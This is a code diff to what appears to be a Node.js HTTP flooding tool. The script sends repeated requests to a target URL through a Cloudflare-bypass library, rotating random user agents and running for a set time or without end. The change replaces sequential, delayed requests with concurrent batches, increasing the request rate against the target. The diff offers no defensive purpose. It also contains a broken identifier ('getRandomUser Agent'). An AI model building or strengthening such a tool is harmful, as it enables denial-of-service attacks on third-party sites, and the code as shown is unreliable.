@@ -4,7 +4,7 @@ const dns = require('dns');
 const { URL } = require('url');
 
 const userAgents = [
-    // List of user agents...
+    // Populate with a list of user agents...
 ];
 
 const ports = [80, 443]; // HTTP and HTTPS ports
@@ -81,11 +81,13 @@ async function senderWithCloudscraper(max, url, time) {
     const endTime = time ? Date.now() + time * 1000 : undefined;
 
     while (!endTime || Date.now() < endTime) {
+        const requests = []; // Array to hold promises
         for (let i = 0; i < max; i++) {
             const userAgent = getRandomUser Agent(); // Get a random user agent
-            await sendRequestWithCloudscraper(url, userAgent);
-            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between requests
+            requests.push(sendRequestWithCloudscraper(url, userAgent)); // Push the promise to the array
         }
+        await Promise.all(requests); // Send all requests concurrently
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between batches of requests
     }
 }
 
